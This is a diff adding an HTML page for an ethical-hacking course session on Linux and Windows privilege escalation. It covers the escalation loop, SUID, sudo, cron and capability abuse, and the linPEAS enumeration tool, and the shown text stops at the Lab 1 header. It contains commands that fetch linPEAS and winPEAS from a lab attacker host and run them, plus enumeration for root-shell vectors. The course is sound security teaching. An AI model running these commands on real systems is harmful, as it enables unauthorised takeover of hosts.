@@ -1,0 +1,1133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Session 06 — System Hacking III: Privilege Escalation &amp; CTF Capstone | CEH · ITGate Academy</title>
+<meta name="description" content="CEH Diploma Session 6 — turn a low-privilege foothold into root and SYSTEM: Linux privilege escalation (linPEAS, SUID + GTFOBins, sudo, cron), Windows privilege escalation (winPEAS, service misconfig, token abuse, Mimikatz/LSASS), steganography, and two full-chain capstone CTFs (DoubleTrouble, Blackpearl) — every escalation carried to its SOC flip, ending in a privesc detection rule and a complete engagement report.">
+<link rel="stylesheet" href="../assets/css/ceh.css">
+<link rel="icon" href="../assets/img/itgate-logo.jpg">
+</head>
+<body data-session="s06">
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="brand" href="../index.html">
+      <img src="../assets/img/itgate-logo.jpg" alt="ITGate Academy">
+      <span class="brand-text">
+        <span class="brand-name">ITGate Academy</span>
+        <span class="brand-sub">CEH · Session 06</span>
+      </span>
+    </a>
+    <nav class="topnav">
+      <a href="../index.html">All sessions</a>
+      <a href="../index.html#lab">Lab</a>
+      <a href="../index.html#resources">Resources</a>
+    </nav>
+  </div>
+</header>
+
+<div class="progress-wrap"><div class="wrap progress-inner" id="progressHost"></div></div>
+
+<div class="wrap section">
+<div class="page-layout">
+
+  <aside class="sidebar">
+    <h5>Session 06 · Pages</h5>
+    <ol id="sessionNav"></ol>
+    <div class="side-cta">
+      <h5>Deliverable</h5>
+      <a href="report.html">📋 Open Team Report</a>
+    </div>
+  </aside>
+
+  <article>
+
+  <svg aria-hidden="true" focusable="false" width="0" height="0" style="position:absolute">
+    <defs>
+      <marker id="ar-o" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#ff7043"/></marker>
+      <marker id="ar-c" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#22d3ee"/></marker>
+      <marker id="ar-g" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#768290"/></marker>
+      <marker id="ar-r" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#e63946"/></marker>
+      <marker id="ar-grn" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#4ade80"/></marker>
+      <marker id="ar-am" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#fbbf24"/></marker>
+      <marker id="ar-pu" markerWidth="9" markerHeight="9" refX="6.5" refY="3" orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="#a78bfa"/></marker>
+    </defs>
+  </svg>
+
+  <section class="page" data-title="Welcome">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06</span><span class="tag offensive">System Hacking III · Own It</span><span class="time">&#9201; 4 hours</span></div>
+      <h1>Privilege Escalation &amp; CTF Capstone</h1>
+      <p class="lede">You landed a shell in Session 5. Most of them were <strong>low-privilege</strong>. This is where you become <strong>root</strong> and <strong>SYSTEM</strong> — then prove the whole chain on a capstone.</p>
+    </div>
+    <div class="content">
+      <div class="oneline">Recon (S2) &rarr; scan (S3) &rarr; vuln + creds (S4) &rarr; shell (S5). Today is the last link of the offensive
+        chain: turn that shell into <b>total control</b> of the host, harvest what it holds, and then run the entire kill chain end
+        to end on a fresh machine you have never seen.</div>
+
+      <h2><span class="h-t">Today&#39;s agenda</span></h2>
+      <div class="tbl-scroll">
+      <table><colgroup><col style="width:13%"><col style="width:58%"><col style="width:17%"><col style="width:12%"></colgroup>
+        <thead><tr><th>Block</th><th>What we do</th><th>Format</th><th>Min</th></tr></thead>
+        <tbody>
+          <tr><td>1</td><td>Where we left off &mdash; your foothold record is today&#39;s raw material</td><td>Theory</td><td>6</td></tr>
+          <tr><td>2</td><td><strong>Lab pre-flight</strong> &mdash; low-priv shells ready, linPEAS/winPEAS staged</td><td>Hands-on</td><td>5</td></tr>
+          <tr><td>3</td><td>Privilege escalation &mdash; the concept + the enumeration loop</td><td>Theory</td><td>8</td></tr>
+          <tr><td colspan="4" class="mono" style="color:var(--orange)">&mdash; Half A · Linux privilege escalation &mdash;</td></tr>
+          <tr><td>4</td><td>The Linux privesc surface &mdash; where root leaks</td><td>Theory</td><td>8</td></tr>
+          <tr><td>5</td><td><span class="mono">linPEAS</span> &mdash; automated enumeration</td><td>Theory</td><td>7</td></tr>
+          <tr><td>6</td><td><strong>Lab 1</strong> &mdash; SUID binary + GTFOBins &rarr; <strong>root</strong></td><td>Hands-on</td><td>15</td></tr>
+          <tr><td>7</td><td>sudo &amp; cron abuse &mdash; the mechanism</td><td>Theory</td><td>8</td></tr>
+          <tr><td>8</td><td><strong>Lab 2</strong> &mdash; sudo misconfig / writable cron &rarr; root</td><td>Hands-on</td><td>14</td></tr>
+          <tr><td colspan="4" class="mono" style="color:var(--orange)">&mdash; Half B · Windows privilege escalation &mdash;</td></tr>
+          <tr><td>9</td><td>The Windows privesc surface &mdash; services, tokens, misconfig</td><td>Theory</td><td>8</td></tr>
+          <tr><td>10</td><td>Token abuse &mdash; SeImpersonate &rarr; SYSTEM (the mechanism)</td><td>Theory</td><td>8</td></tr>
+          <tr><td>11</td><td><strong>Lab 3</strong> &mdash; service misconfig / potato &rarr; <strong>SYSTEM</strong></td><td>Hands-on</td><td>15</td></tr>
+          <tr><td>12</td><td><span class="mono">winPEAS</span> + <strong>Mimikatz</strong> &mdash; dumping LSASS</td><td>Theory</td><td>9</td></tr>
+          <tr><td>&mdash;</td><td>Break</td><td>&mdash;</td><td>10</td></tr>
+          <tr><td>13</td><td><strong>Lab 4</strong> &mdash; Mimikatz: dump passwords, hashes &amp; tickets</td><td>Hands-on</td><td>12</td></tr>
+          <tr><td colspan="4" class="mono" style="color:var(--orange)">&mdash; Steganography · capstone · defence · deliverable &mdash;</td></tr>
+          <tr><td>14</td><td>Steganography &mdash; hiding data in plain sight</td><td>Theory</td><td>7</td></tr>
+          <tr><td>15</td><td><strong>Lab 5</strong> &mdash; steghide / stegseek + NTFS ADS (hide, extract, detect)</td><td>Hands-on</td><td>10</td></tr>
+          <tr><td>16</td><td>The capstone &mdash; the whole kill chain on one machine</td><td>Theory</td><td>6</td></tr>
+          <tr><td>17</td><td><strong>Lab 6</strong> &mdash; Capstone A: <strong>DoubleTrouble</strong> (web &rarr; stego &rarr; shell &rarr; root)</td><td>Hands-on</td><td>25</td></tr>
+          <tr><td>18</td><td><strong>Lab 7</strong> &mdash; Capstone B: <strong>Blackpearl</strong> (DNS &rarr; CMS &rarr; SUID &rarr; root)</td><td>Hands-on</td><td>25</td></tr>
+          <tr><td>19</td><td>The privesc SOC flip &mdash; what elevation writes to the logs</td><td>Defender</td><td>6</td></tr>
+          <tr><td>20</td><td><strong>Lab 8</strong> &mdash; write the privesc detection rule (signature exercise)</td><td>Hands-on</td><td>16</td></tr>
+          <tr><td>21</td><td><strong>Lab 9</strong> &mdash; the engagement report (the whole S2&ndash;S6 chain)</td><td>Hands-on</td><td>14</td></tr>
+          <tr><td>22</td><td>Where the diploma goes next &mdash; System Hacking complete</td><td>Theory</td><td>5</td></tr>
+          <tr><td>23</td><td>Knowledge check &middot; practice range &middot; homework</td><td>Wrap-up</td><td>18</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box key-takeaway"><span class="box-t">What you hand in today</span><p>Two things. A complete <strong>engagement report</strong> &mdash; the whole kill chain on your capstone machine: recon,
+      the way in, the privilege escalation, proof of root/SYSTEM, and a remediation line per finding. And <strong>one working
+      privilege-escalation detection rule</strong> (Sigma / SPL / KQL) from evidence you generate. The report is the capstone of
+      the entire offensive half of the diploma.</p></div>
+      <div class="box warn"><span class="box-t">Authorisation — read before anything</span><p>Everything today runs against <strong>your own host-only lab</strong> and the capstone VMs <em>you</em> deploy. Dumping
+      LSASS, abusing SUID, or escalating to root on any host you do not own is a criminal offence. The lab hands you the target
+      <em>and</em> the authorisation; that authorisation does not travel.</p></div>
+      <div class="box soc"><span class="box-t">The spine of the session</span><p>Privilege escalation is <strong>loud</strong>: a low-priv user suddenly holding SYSTEM privileges (<span class="mono">4672</span>),
+      a new service installed to run your payload (<span class="mono">7045</span>), a process reaching into LSASS
+      (<span class="mono">Sysmon 10</span>). So every escalation today carries its SOC flip, and the session ends with you writing
+      the detection rule from evidence you generated by escalating yourself.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Where we left off">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P02</span><span class="tag theory">Bridge · S5 &rarr; S6</span><span class="time">&#9201; 6 min</span></div>
+      <h1>Whose Shell Is It? Now Make It root.</h1>
+      <p class="lede">Session 5 ended with a foothold record. Its most important column &mdash; &quot;landed as&quot; &mdash; is exactly what today starts from.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the foothold record IS today&#39;s to-do list</span><p>You finished Session 5 with a shell on each host and the <strong>user context you landed as</strong>. A few said SYSTEM/root &mdash; those hosts are done. Most said a low-privilege user. Every one of those low-priv rows is a privilege-escalation job for today. We do not re-teach getting the shell &mdash; we take the shell you have and make it root.</p></div>
+
+      <h2><span class="h-t">The kill chain &mdash; the last offensive link</span></h2>
+      <figure class="dgm pktflow">
+          <svg viewBox="0 0 940 262" role="img" aria-label="The engagement chain: recon, scan, credentials, exploitation to a shell in Session 5, then privilege escalation to full control in Session 6 which is highlighted, feeding the final engagement report.">
+          <rect x="105" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--text-3)"/>
+          <text class="d-title" x="230" y="54" text-anchor="middle" font-size="14" fill="var(--text-3)">Foothold (S5)</text>
+          <text class="d-sub" x="230" y="70" text-anchor="middle">low-priv shell</text>
+          <line x1="230" y1="80" x2="230" y2="240" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <rect x="585" y="30" width="250" height="50" rx="9" fill="var(--panel-2)" stroke="var(--orange)"/>
+          <text class="d-title" x="710" y="54" text-anchor="middle" font-size="14" fill="var(--orange)">YOU ARE HERE</text>
+          <text class="d-sub" x="710" y="70" text-anchor="middle">S6 &middot; Privesc</text>
+          <line x1="710" y1="80" x2="710" y2="240" stroke="var(--line-soft)" stroke-dasharray="2 4"/>
+          <g class="pf-step" data-step="1" style="--pf-dx:-26px">
+          <rect x="245" y="98" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--cyan)"/>
+          <text x="470" y="118" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--cyan)">S5 gave you: a shell + the USER you landed as</text>
+          </g>
+          <g class="pf-step" data-step="2" style="--pf-dx:-26px">
+          <text x="470" y="160" text-anchor="middle" font-size="12.5" font-weight="700" fill="var(--orange)">escalate: low-priv &rarr; root / SYSTEM</text>
+          <path d="M236,174 L704,174" fill="none" stroke="var(--orange)" stroke-width="2.4" marker-end="url(#ar-o)"/>
+          </g>
+          <g class="pf-step" data-step="3" style="--pf-dx:-26px">
+          <rect x="245" y="206" width="450" height="30" rx="8" fill="var(--panel)" stroke="var(--purple)"/>
+          <text x="470" y="226" text-anchor="middle" font-size="12.5" font-weight="600" fill="var(--purple)">full control &rarr; loot &rarr; the engagement report</text>
+          </g>
+          </svg>
+        <div class="pf-ctl"><button type="button" data-pf="prev">&#8249; Back</button><button type="button" data-pf="play">&#9654; Play</button><button type="button" data-pf="next">Next &#8250;</button><span class="pf-count"></span></div>
+        <div class="pf-cap" data-cap="1"><span class="pf-n">STEP 1</span>Open your foothold record. Every row that is not already SYSTEM/root is a target for today.</div>
+        <div class="pf-cap" data-cap="2"><span class="pf-n">STEP 2</span>Enumerate the host, find one misconfiguration, abuse it. Linux and Windows have different surfaces but the same loop.</div>
+        <div class="pf-cap" data-cap="3"><span class="pf-n">STEP 3</span>Once you are root/SYSTEM you own the host: dump credentials, pivot, and write it all up. That report is the capstone of the whole offensive half.</div>
+        </figure>
+
+      <div class="split">
+        <div class="box attacker-view"><span class="box-t">Vertical escalation</span><p><strong>Low-privilege user &rarr; root / Administrator / SYSTEM.</strong> The most common and most dangerous move &mdash; it is the difference between &quot;a foothold&quot; and &quot;the box is ours.&quot; This is 90% of today.</p></div>
+        <div class="box attacker-view"><span class="box-t">Horizontal escalation</span><p><strong>Same privilege level, another user&#39;s resources.</strong> Reading another user&#39;s files, reusing their credentials, stepping sideways to reach an account that <em>can</em> go vertical. Often the setup for the vertical jump.</p></div>
+      </div>
+      <div class="box key-takeaway"><span class="box-t">One line to carry all session</span><p><strong class="hl">Getting in is access; getting root is control.</strong> Everything today turns the first into the second &mdash; and the capstone proves you can do the whole chain unaided.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab pre-flight">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P03</span><span class="tag lab">Hands-on · everyone</span><span class="time">&#9201; 5 min</span></div>
+      <h1>Pre-flight: A Low-Priv Shell, and the Enumeration Kit</h1>
+      <p class="lede">You need a shell to escalate <em>from</em>. Restore one from Session 5 and stage the enumeration tools.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why a pre-flight</span><p>Privilege escalation starts from an existing foothold. If you cannot reproduce a low-priv shell, you have nothing to escalate. Restore one from your Session 5 foothold record and make sure the enumeration scripts are on the target.</p></div>
+      <ol class="steps">
+<li>
+<strong>Get a low-privilege shell</strong> on a target from your S5 foothold record (or reproduce one quickly).
+<pre><code># e.g. a low-priv shell on the Linux target, or win10\lab on Windows
+id          # Linux: uid=1000(lowuser) ...
+whoami      # Windows: win10-tgt01\lab</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>You have a working shell as a <strong>non-root / non-admin</strong> user</li></ul></div>
+</li>
+<li>
+<strong>Stage the enumeration scripts</strong> (transfer to the target; keep them handy).
+<pre><code># Linux (on Kali, serve; on target, fetch):
+python3 -m http.server 8000     # Kali
+wget http://192.168.56.101:8000/linpeas.sh -O /tmp/linpeas.sh ; chmod +x /tmp/linpeas.sh
+# Windows:
+certutil -urlcache -f http://192.168.56.101:8000/winPEASx64.exe wp.exe</code></pre>
+<div class="verify"><h4>&#10003; Verification</h4><ul><li><span class="mono">linpeas.sh</span> on the Linux target; <span class="mono">winPEASx64.exe</span> on the Windows target</li></ul></div>
+</li>
+<li>
+<strong>Snapshot</strong> the capstone VMs before you start (DoubleTrouble, Blackpearl) so a team can revert cleanly.
+<div class="verify"><h4>&#10003; Verification</h4><ul><li>Both capstone VMs imported, host-only, snapshotted <span class="mono">pre-s6</span></li></ul></div>
+</li>
+</ol>
+      <div class="box warn"><span class="box-t">Transfer discipline</span><p>Enumeration scripts touch a lot of files and are noisy &mdash; exactly the kind of thing the SOC-flip page covers. In the lab that is fine; on a real engagement you would be far more selective. Note where you dropped them so you can clean up.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Privilege escalation">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P04</span><span class="tag theory">Method · the loop</span><span class="time">&#9201; 8 min</span></div>
+      <h1>The Enumeration Loop: Look, Identify, Abuse</h1>
+      <p class="lede">Privilege escalation is not a trick you memorise &mdash; it is a <strong>loop you run</strong>. Enumerate the host, spot one thing out of place, abuse it.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why the loop before the tricks</span><p>There are hundreds of privesc &quot;tricks&quot; and you will forget most of them. What you keep is the <strong>loop</strong>: systematically enumerate everything the current user can see, compare it against &quot;what should a normal user have,&quot; and abuse the one thing that is wrong. linPEAS/winPEAS automate the <em>looking</em> &mdash; the loop is the thinking.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 160" role="img" aria-label="The privilege escalation loop: enumerate the host, identify a misconfiguration, abuse it to escalate, verify you are root or SYSTEM. Click each stage.">
+          <g class="node" data-node="pe1" tabindex="0"><rect x="20" y="50" width="200" height="60" rx="10" fill="#1f2533" stroke="#22d3ee"/><text class="d-title" x="120" y="76" text-anchor="middle" font-size="13">1 &middot; ENUMERATE</text><text class="d-sub" x="120" y="94" text-anchor="middle">what can this user see?</text></g>
+          <g class="node" data-node="pe2" tabindex="0"><rect x="255" y="50" width="200" height="60" rx="10" fill="#1a1f2a" stroke="#fbbf24"/><text class="d-title" x="355" y="76" text-anchor="middle" font-size="13">2 &middot; IDENTIFY</text><text class="d-sub" x="355" y="94" text-anchor="middle">what is out of place?</text></g>
+          <g class="node" data-node="pe3" tabindex="0"><rect x="490" y="50" width="200" height="60" rx="10" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="590" y="76" text-anchor="middle" font-size="13" fill="#ff7043">3 &middot; ABUSE</text><text class="d-sub" x="590" y="94" text-anchor="middle">exploit the misconfig</text></g>
+          <g class="node" data-node="pe4" tabindex="0"><rect x="725" y="50" width="195" height="60" rx="10" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="822" y="76" text-anchor="middle" font-size="13" fill="#4ade80">4 &middot; VERIFY</text><text class="d-sub" x="822" y="94" text-anchor="middle">id / whoami = root?</text></g>
+          <path d="M220,80 L253,80" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <path d="M455,80 L488,80" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <path d="M690,80 L723,80" stroke="#768290" stroke-width="1.6" marker-end="url(#ar-g)"/>
+          <path d="M822,112 C822,140 400,140 120,140 L120,112" fill="none" stroke="#768290" stroke-width="1.3" stroke-dasharray="4 3" marker-end="url(#ar-g)"/>
+          <text class="d-sub" x="470" y="136" text-anchor="middle">not root yet? loop again with what you just learned</text>
+        </svg>
+        <div class="dgm-hint">Click each stage &mdash; and note it is a loop, not a line.</div>
+        <div class="dgm-detail" data-detail="pe1"><h5><span class="dd-tag">1 · ENUMERATE</span>See everything this user can</h5><p><b>Who am I, what can I run, what is installed, what is scheduled, what is writable, what version is the kernel.</b> Do it by hand first (<span class="mono">id</span>, <span class="mono">sudo -l</span>, <span class="mono">find / -perm -4000</span>), then let linPEAS/winPEAS sweep the rest. You cannot exploit what you have not seen.</p></div>
+        <div class="dgm-detail" data-detail="pe2"><h5><span class="dd-tag">2 · IDENTIFY</span>Spot the one thing that is wrong</h5><p><b>Compare what you found against what a normal user should have.</b> A SUID binary that should not be one, a script root runs that you can write, a service you can restart, a token privilege you should not hold. linPEAS colours the leads red/yellow &mdash; but <em>you</em> decide which is real.</p></div>
+        <div class="dgm-detail" data-detail="pe3"><h5><span class="dd-tag">3 · ABUSE</span>Turn the misconfig into root</h5><p><b>Exploit the one finding.</b> GTFOBins for a SUID/sudo binary, a payload into a writable cron script, a potato for a token privilege. This is where the specific technique lives &mdash; but it only works because steps 1&ndash;2 found the target.</p></div>
+        <div class="dgm-detail" data-detail="pe4"><h5><span class="dd-tag">4 · VERIFY</span>Confirm and record</h5><p><b><span class="mono">id</span> = uid=0(root), or <span class="mono">whoami</span> = nt authority\system.</b> Prove it, then record it. If you are not root yet, you are not done &mdash; loop again, now with everything the last pass taught you (new files, new creds, a new user to pivot to).</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; run the loop&#39;s first three manual checks</span><pre><code>id                          # who am I, what groups
+sudo -l                     # what can I run as root without a password?
+find / -perm -4000 2>/dev/null   # every SUID binary on the box</code></pre><p style="margin-top:8px"><b>You should see:</b> three findings in ten seconds: your groups, any <span class="mono">sudo</span> rights, and the full SUID list. Most Linux privesc starts in exactly one of these three outputs.</p></div>
+      <div class="box key-takeaway"><span class="box-t">The rule</span><p><strong class="hl">Enumeration is 90% of privilege escalation.</strong> The exploit is a one-liner once you have found the target &mdash; finding the target is the whole skill. Run the loop; do not guess.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Linux privesc surface">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P05</span><span class="tag theory">Method · where root leaks</span><span class="time">&#9201; 8 min</span></div>
+      <h1>The Linux Privesc Surface &mdash; Where root Leaks</h1>
+      <p class="lede">Six places a Linux box hands root to a user who enumerated properly. Learn the map and linPEAS output stops being noise.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why a map of the surface</span><p>linPEAS prints hundreds of lines. Without a mental map you drown in it. Here are the six categories that actually give root &mdash; click each for what to look for and how it is abused. Every Linux privesc you meet, in the labs and the capstone, is one of these.</p></div>
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 210" role="img" aria-label="The Linux privilege escalation surface: SUID binaries, sudo rights, cron jobs, writable PATH, capabilities, and kernel exploits. Click each.">
+          <rect x="360" y="14" width="220" height="40" rx="9" fill="#1f2533" stroke="#e63946"/><text class="d-title" x="470" y="40" text-anchor="middle" font-size="14">low-priv user</text>
+          <g class="node" data-node="su" tabindex="0"><rect x="20" y="90" width="200" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="120" y="112" text-anchor="middle" font-size="12.5">SUID / SGID binaries</text><text class="d-sub" x="120" y="128" text-anchor="middle">runs as the file owner</text></g>
+          <g class="node" data-node="sudo" tabindex="0"><rect x="240" y="90" width="200" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="340" y="112" text-anchor="middle" font-size="12.5">sudo rights</text><text class="d-sub" x="340" y="128" text-anchor="middle">sudo -l</text></g>
+          <g class="node" data-node="cron" tabindex="0"><rect x="460" y="90" width="200" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="560" y="112" text-anchor="middle" font-size="12.5">cron jobs</text><text class="d-sub" x="560" y="128" text-anchor="middle">root runs your script</text></g>
+          <g class="node" data-node="path" tabindex="0"><rect x="680" y="90" width="240" height="46" rx="8" fill="#1a1f2a" stroke="#ff7043"/><text class="d-lbl" x="800" y="112" text-anchor="middle" font-size="12.5">writable PATH / files</text><text class="d-sub" x="800" y="128" text-anchor="middle">hijack a command</text></g>
+          <g class="node" data-node="cap" tabindex="0"><rect x="150" y="150" width="270" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="285" y="172" text-anchor="middle" font-size="12.5">capabilities</text><text class="d-sub" x="285" y="188" text-anchor="middle">getcap -r / (cap_setuid&hellip;)</text></g>
+          <g class="node" data-node="kern" tabindex="0"><rect x="520" y="150" width="270" height="46" rx="8" fill="#1f2533" stroke="#fbbf24"/><text class="d-lbl" x="655" y="172" text-anchor="middle" font-size="12.5">kernel exploits</text><text class="d-sub" x="655" y="188" text-anchor="middle">uname -a &rarr; last resort</text></g>
+          <path d="M430,56 L120,88" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M455,56 L340,88" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M485,56 L560,88" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+          <path d="M510,56 L800,88" fill="none" stroke="#768290" stroke-width="1.2" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each &mdash; what to look for, and the one command that finds it.</div>
+        <div class="dgm-detail" data-detail="su"><h5><span class="dd-tag">SUID / SGID</span>Runs as the owner, not you</h5><p><b>A binary with the SUID bit runs as its <em>owner</em> (often root), whoever launches it.</b> Find them: <span class="mono">find / -perm -4000 2>/dev/null</span>. If one is in <b>GTFOBins</b> (e.g. <span class="mono">find</span>, <span class="mono">vim</span>, <span class="mono">nmap</span>, <span class="mono">bash</span>, <span class="mono">cp</span>), a one-liner spawns a root shell. Lab 1.</p></div>
+        <div class="dgm-detail" data-detail="sudo"><h5><span class="dd-tag">sudo -l</span>What you may run as root</h5><p><b><span class="mono">sudo -l</span> lists commands you can run via sudo</b> &mdash; sometimes without a password. If any is in GTFOBins (<span class="mono">less</span>, <span class="mono">vi</span>, <span class="mono">awk</span>, <span class="mono">python</span>&hellip;), it breaks out to a root shell. <span class="mono">(ALL) NOPASSWD: /usr/bin/vim</span> is game over.</p></div>
+        <div class="dgm-detail" data-detail="cron"><h5><span class="dd-tag">cron</span>root runs a script you can write</h5><p><b>A cron job runs as root on a schedule.</b> If the script it runs (or a directory in its path) is <em>writable by you</em>, put your payload in it and wait &mdash; it executes as root. Check <span class="mono">cat /etc/crontab</span> and <span class="mono">ls -la</span> the scripts. Lab 2.</p></div>
+        <div class="dgm-detail" data-detail="path"><h5><span class="dd-tag">writable PATH / files</span>Hijack a command</h5><p><b>If a root process calls a command by name (not full path) and you can write earlier in its PATH,</b> you plant a malicious binary of that name. Also: a world-writable <span class="mono">/etc/passwd</span> or a writable script root sources.</p></div>
+        <div class="dgm-detail" data-detail="cap"><h5><span class="dd-tag">capabilities</span>SUID&#39;s finer-grained cousin</h5><p><b>File capabilities grant slices of root power without the SUID bit.</b> <span class="mono">getcap -r / 2>/dev/null</span>. <span class="mono">cap_setuid</span> on python or perl = spawn a root shell directly. Easy to miss because they are not SUID.</p></div>
+        <div class="dgm-detail" data-detail="kern"><h5><span class="dd-tag">kernel exploits</span>The last resort</h5><p><b>An old kernel (<span class="mono">uname -a</span>) may have a public local-root exploit (DirtyCow, DirtyPipe, PwnKit).</b> Powerful but <em>risky</em> &mdash; they can panic the box. Try misconfigs first; reach for a kernel exploit only when nothing else works.</p></div>
+      </figure>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; map the surface in three commands</span><pre><code>find / -perm -4000 2>/dev/null      # SUID
+sudo -l                              # sudo rights
+getcap -r / 2>/dev/null               # capabilities</code></pre><p style="margin-top:8px"><b>You should see:</b> the three highest-yield checks on the whole box. If any SUID/sudo entry appears on <b>GTFOBins</b>, you are one line from root &mdash; which is exactly Lab 1.</p></div>
+      <div class="box key-takeaway"><span class="box-t">The one site to know</span><p><strong class="hl">GTFOBins</strong> (gtfobins.github.io) is the lookup table for &quot;this binary is SUID / I can sudo it &mdash; how do I get a shell?&quot; Half of Linux privesc is: find the binary, look it up, paste the one-liner.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="linPEAS">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S06 &middot; P06</span><span class="tag theory">Tool · automated enumeration</span><span class="time">&#9201; 7 min</span></div>
+      <h1>linPEAS &mdash; the Enumeration Sweep</h1>
+      <p class="lede">You will never enumerate a box by hand as thoroughly as linPEAS does in ninety seconds. Learn to read its colours.</p>
+    </div>
+    <div class="content">
+<div class="box intro"><span class="box-t">Why automate the looking</span><p>The manual checks on the last page are the high-yield ones &mdash; but a box has hundreds of privesc-relevant facts. linPEAS checks them all and <strong>colour-codes</strong> the results so your eye goes to what matters. Your job shifts from <em>finding</em> to <em>judging</em>.</p></div>
+      <h2 class="mono" style="color:var(--orange)"><span class="h-t">linPEAS &mdash; the 7-part frame</span></h2>
+<div class="tbl-scroll">
+<table><colgroup><col style="width:38%"><col style="width:62%"></colgroup>
+<tbody>
+<tr><td style="width:150px"><strong>What it is</strong></td><td>A large enumeration script (part of the PEASS-ng suite) that sweeps a Linux host for every known privilege-escalation vector and highlights the promising ones.</td></tr>
+<tr><td style="width:150px"><strong>Why it exists</strong></td><td>To do the boring, exhaustive <em>looking</em> perfectly and fast, so the analyst spends time on judgement, not on remembering 200 checks.</td></tr>
+<tr><td style="width:150px"><strong>The method</strong></td><td>Get it onto the target, run it, and <strong>read the colours</strong>: <span style="color:#e63946">red/yellow = 95% a privesc vector</span>, red = interesting. Start at the top with SUID, sudo, cron, then work down.</td></tr>
+<tr><td style="width:150px"><strong>Real syntax</strong></td><td><pre><code>wget http://192.168.56.101:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.out   # keep a copy to grep
+# fast, quieter targeted run:
+/tmp/linpeas.sh -o SysI,Devs,AvailSoft,Proc,Var</code></pre></td></tr>
+<tr><td style="width:150px"><strong>Read the output</strong></td><td><span style="color:#e63946">Red on yellow</span> = a highly likely vector (a writable cron, an exploitable SUID). Note them, then <em>confirm each by hand</em> &mdash; linPEAS flags candidates, it does not prove them.</td></tr>
+<tr><td style="width:150px"><strong>What it feeds</strong></td><td>A shortlist of vectors &rarr; the ABUSE step (GTFOBins, a cron payload) &rarr; root &rarr; the engagement report.</td></tr>
+<tr><td style="width:150px"><strong>SOC flip</strong></td><td><span style="color:var(--green)">Very noisy.</span> It reads a huge number of files and spawns many processes in seconds &mdash; a burst of <span class="mono">execve</span> and file access from one user is itself a detection signal (auditd / EDR). On a real engagement you would enumerate far more selectively.</td></tr>
+</tbody></table>
+</div>
+      <div class="box lab-box"><span class="box-t">&#9654; Prove it &mdash; run it and read only the red/yellow</span><pre><code>/tmp/linpeas.sh | tee /tmp/linpeas.out
+# then jump straight to the highlighted sections:
+grep -iE 'SUID|sudo|crontab|Writable|Capabilities' /tmp/linpeas.out | head</code></pre><p style="margin-top:8px"><b>You should see:</b> a shortlist of the box&#39;s real privesc vectors in one screen. You still confirm each by hand &mdash; but linPEAS told you <b>where to look</b>.</p></div>
+      <div class="box note"><span class="box-t">winPEAS is the same idea</span><p>For Windows there is <span class="mono">winPEAS</span> (same suite) &mdash; it sweeps services, tokens, registry, unattended files and installed software, colour-coded the same way. You will run it in Half B. Learn to read the colours once; it transfers.</p></div>
+    </div>
+  </section>
+  <section class="page" data-title="Lab 1: SUID &rarr; root">
+    <div class="page-head">
